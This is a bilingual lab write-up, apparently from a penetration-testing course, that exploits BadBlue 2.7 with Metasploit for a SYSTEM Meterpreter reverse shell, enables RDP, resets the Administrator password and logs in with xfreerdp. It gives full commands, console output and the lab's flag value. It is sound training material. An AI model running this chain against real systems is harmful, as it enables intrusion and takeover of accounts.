---
layout: post
title: "Enabling RDP"
date: "2023-03-01"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Enabling RDP
The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.

RDP uses TCP port 3389 by default.

RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.

RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

# 启用 RDP
远程桌面协议（Remote Desktop Protocol，简称 RDP）是微软开发的专有 GUI 远程访问协议，用于远程连接 Windows 系统并与之交互。

RDP 默认使用 TCP 端口 3389。

RDP 默认情况下是禁用的，但是，我们可以利用 MSF 漏洞利用模块在 Windows 目标上启用 RDP，从而利用 RDP 远程访问目标系统。

RDP 身份验证需要目标系统上的合法用户帐户以及明文形式的用户密码。

# Demo: Enabling RDP（演示：启用 RDP）
We'll be exploring the process of how to enable RDP on a Windows target after we've gained access, and we'll also take a look at how to utilize the RDP protocol so that we can authenticate with the target system via RDP and consequently gain access and interact with the target system.

The key thing that you need to take into consideration there is that it's a graphical user interface remote access protocol, which means RDP provides you with a GUI in terms of controlling your target. It's not like a terminal remote access tool or protocol like SSH where you need to log in and then you have access with a command prompt. In this case, you get access to the full Windows experience. So you'll get access to the desktop.

And in our case, because we've only been able to get hashes, we'll be changing the Administrator's password, so that we can gain access to the system via RDP, as RDP will require clear text credentials.

Let's take a look at how we can enable RDP and also utilize our RDP to authenticate and gain access to the target system.

Target IP Address: 10.2.19.254

```
service postgresql start && msfconsole
workspace -a RDP
setg RHOSTS 10.2.19.254
db_nmap -sV 10.2.19.254
```

Because we performed a default port scan that scanned 1,000 of the most common ports, we weren't able to identify 3389 as open, so RDP by default on this system is disabled.

```
search badblue
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

Get user id.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

And we currently have `NT AUTHORITY\SYSTEM` privileges, which are the highest privileges available on a Windows system.

Perform some local system enumeration.

```
meterpreter > sysinfo
Meterpreter : x86/windows
```

In this case, we don't need to upgrade our Meterpreter session to a 64-bit Meterpreter session.

Enable RDP on the target system.

Put this in the background using the `Ctrl+Z` keyboard combination.

```
search enable_rdp
```

[Windows Manage Enable Remote Desktop](https://www.rapid7.com/db/modules/post/windows/manage/enable_rdp/)

This module enables the Remote Desktop Service (RDP). It provides the options to create an account and configure it to be a member of the Local Administrators and Remote Desktop Users group. It can also forward the target's port 3389/tcp.

Windows 管理启用远程桌面

此模块启用远程桌面服务 (RDP)。它提供了创建帐户并将其配置为本地管理员和远程桌面用户组成员的选项。它还可以转发目标的端口 3389/tcp。

```
use post/windows/manage/enable_rdp
show options
```

We have the `ENABLE` options set to true, so that will enable RDP and add the firewall exception. It'll allow us to communicate with port 3389.

And then we can perform some port forwarding. We'll be exploring this during the pivoting video.

If you enable port forwarding, you can set up the local port to 3389, as well, and connect to your local host on port 3389, and port forwarding will handle the connection.

We also have the `PASSWORD` option, so that will allow you to create a user and specify the password.

However, in this case, we're going to be changing the Administrator password.

```
set SESSION 1
exploit
```

And in this case, it looks like RDP was already enabled. We'll need to confirm that.

We can perform a quick Nmap scan to verify that. Let's see whether port 3389 is currently open, so that we can confirm that RDP is indeed enabled on the target.

```
db_nmap -p 3389 10.2.19.254
```

And in this case, we can see that port 3389 is now open, which means we now have RDP running on the target.

How do we gain access to RDP?

We need a legitimate user account on the system. Furthermore, we also need a clear-text password.

Given the fact that we already have access to the target via a Meterpreter session. We can pop up the command prompt by typing in `shell`.

```
sessions 1
meterpreter > shell
```

And list out the users on the system by saying `net users`.

```
C:\Windows\system32>net users

User accounts for \\
---------------------------------------------------------------------
Administrator           Guest
```

We only have the Administrator and Guest user.

You can create another user account on the system, and you can do that through the Enable RDP module, as we explored.

But in this case, we are going to change the password for the Administrator user. This is not recommended, because this is an obvious indicator of compromise on the target system, because once the Administrator tries to log on, then they're going to find out that their password has been changed, and consequently find out that the system has been hacked, so this is not really recommended.

Specify the user that we want to modify the password for. And then specify the new password.

```
C:\Windows\system32>net user administrator hacker_123321
```

In order to change user account passwords, you need to have administrative privileges. Otherwise, you would have to go through the process of cracking hashes or utilize Mimikatz to dump clear text passwords from memory.

Terminate the channel here, and we'll go back to our Meterpreter session.

```
meterpreter > 
```

Now that we have obtained legitimate credentials here, how do we interact with RDP from a Linux system?

We can create a new tab and we can utilize a utility called `xfreerdp`.

`/u:`: Specify the username that we want to authenticate as.

`/p:`: Specify the password here.

`/v:`: Specify the target host or the IP address.

```
xfreerdp /u:administrator /p:hacker_123321 /v:10.2.19.254
```

However, if another user is logged on, or the administrator user is currently logged on, then they will see some activity that looks strange. So this is something that you would do typically through another user account.

During a standard penetration test, I would recommend creating another user account. And then utilizing that. However, in that particular case, you will also need to add that other user account to the Administrators group, so that you have administrative privileges. Otherwise, you'll have standard user privileges.

That is how to enable RDP on a Windows target and consequently gain access to the target system via RDP.

# Windows: Enabling Remote Desktop
## Overview
A Kali GUI machine and a target machine running a vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the vulnerable application using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. Then, enable the target machine RDP service and access it using xfreerdp tool.

Note: rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

Objective: Your task is to find and exploit the vulnerable application and get the RDP session to find the flag!

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. 
* The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1 
* Dictionaries to use: + /usr/share/metasploit-framework/data/wordlists/common_users.txt + /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1958.pdf

# Windows：启用远程桌面
## 概述
为您提供了 Kali GUI 机器和运行易受攻击应用程序的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。

您的任务是使用 Kali 机器上可用的工具对易受攻击的应用程序进行指纹识别，然后使用 Metasploit 框架利用该漏洞。然后，启用目标机器 RDP 服务并使用 xfreerdp 工具访问它。

注意：  rdesktop 将无法在此设置上运行，因为它不支持 NLA。请使用 xfreerdp 连接到 RDP 服务器。

目标： 你的任务是找到并利用易受攻击的应用程序，并让 RDP 会话找到标志！

说明：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口 运行“ip addr”来知道 X 和 Y 的值。 
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关 
* 使用的字典：+ /usr/share/metasploit-framework/data/wordlists/common_users.txt + /usr/share/metasploit-framework /data/wordlists/unix_passwords.txt

## 解决方案
本实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-1958.pdf

# 复现视频内容
Target IP Address : 10.0.31.240

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a rdp
[*] Added workspace: rdp
[*] Workspace: rdp
msf5 > setg RHOSTS 10.0.31.240
RHOSTS => 10.0.31.240
msf5 > db_nmap -sV 10.0.31.240
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-03-01 18:40 IST
[*] Nmap: Nmap scan report for 10.0.31.240
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 80/tcp    open  http         BadBlue httpd 2.7
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 60.43 seconds

```

```
msf5 > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


msf5 > use exploit/windows/http/badblue_passthru
msf5 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.0.31.240      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf5 exploit(windows/http/badblue_passthru) > set target 
set target 0                            set target BadBlue\ 2.72b\ Universal    
set target 1                            set target BadBlue\ EE\ 2.7\ Universal  
msf5 exploit(windows/http/badblue_passthru) > set target BadBlue\ EE\ 2.7\ Universal 
target => BadBlue EE 2.7 Universal
msf5 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.21.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (180291 bytes) to 10.0.31.240
[*] Meterpreter session 1 opened (10.10.21.5:4444 -> 10.0.31.240:49231) at 2023-03-01 18:45:25 +0530

meterpreter > 

```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows

```

```
msf5 exploit(windows/http/badblue_passthru) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.21.5:4444 -> 10.0.31.240:49231 (10.0.31.240)

msf5 exploit(windows/http/badblue_passthru) > search enable_rdp

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  post/windows/manage/enable_rdp                   normal  No     Windows Manage Enable Remote Desktop
```

```
msf5 exploit(windows/http/badblue_passthru) > use post/windows/manage/enable_rdp
msf5 post(windows/manage/enable_rdp) > show options

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT     3389             no        Local port to forward remote connection.
   PASSWORD                   no        Password for the user created.
   SESSION                    yes       The session to run this module on.
   USERNAME                   no        The username of the user to create.

```

```
模块选项（post/windows/manage/enable_rdp）：

名称    当前设置        需要的  说明
----    -------------- ------ ----------
ENABLE  true           no     启用 RDP 服务和防火墙例外。
FORWARD false          no     将远程端口 3389 转发到本地端口。
LPORT   3389           no     用于转发远程连接的本地端口。
PASSWORD               no     创建的用户的密码。
SESSION                yes    运行此模块的会话。
USERNAME               no     要创建的用户的用户名。
```

```
msf5 post(windows/manage/enable_rdp) > set SESSION 1
SESSION => 1
msf5 post(windows/manage/enable_rdp) > exploit

[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[+] 	RDP Service Started
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20230301185736_rdp_10.0.31.240_host.windows.cle_422632.txt
[*] Post module execution completed

```

```
msf5 post(windows/manage/enable_rdp) > services
Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.0.31.240  80     tcp    http          open   BadBlue/2.7
10.0.31.240  135    tcp    msrpc         open   Microsoft Windows RPC
10.0.31.240  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.0.31.240  445    tcp    microsoft-ds  open   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
10.0.31.240  49152  tcp    msrpc         open   Microsoft Windows RPC
10.0.31.240  49153  tcp    msrpc         open   Microsoft Windows RPC
10.0.31.240  49154  tcp    msrpc         open   Microsoft Windows RPC
10.0.31.240  49155  tcp    msrpc         open   Microsoft Windows RPC
10.0.31.240  49165  tcp    msrpc         open   Microsoft Windows RPC

msf5 post(windows/manage/enable_rdp) > db_nmap -p 3389 10.0.31.240
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-03-01 19:01 IST
[*] Nmap: Nmap scan report for 10.0.31.240
[*] Nmap: Host is up (0.0025s latency).
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 3389/tcp open  ms-wbt-server
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds

```

```
msf5 post(windows/manage/enable_rdp) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 1844 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    
The command completed with one or more errors.

C:\Windows\system32>net users administrator hacker_123321
net users administrator hacker_123321
The command completed successfully.

C:\Windows\system32>^C
Terminate channel 2? [y/N]  y
meterpreter > 
```

```
root@attackdefense:~# xfreerdp /u:administrator /p:hacker_123321 /v:10.0.31.240
```

The flag is on the desktop: 763e1c86da26c66e86a8537fd343280d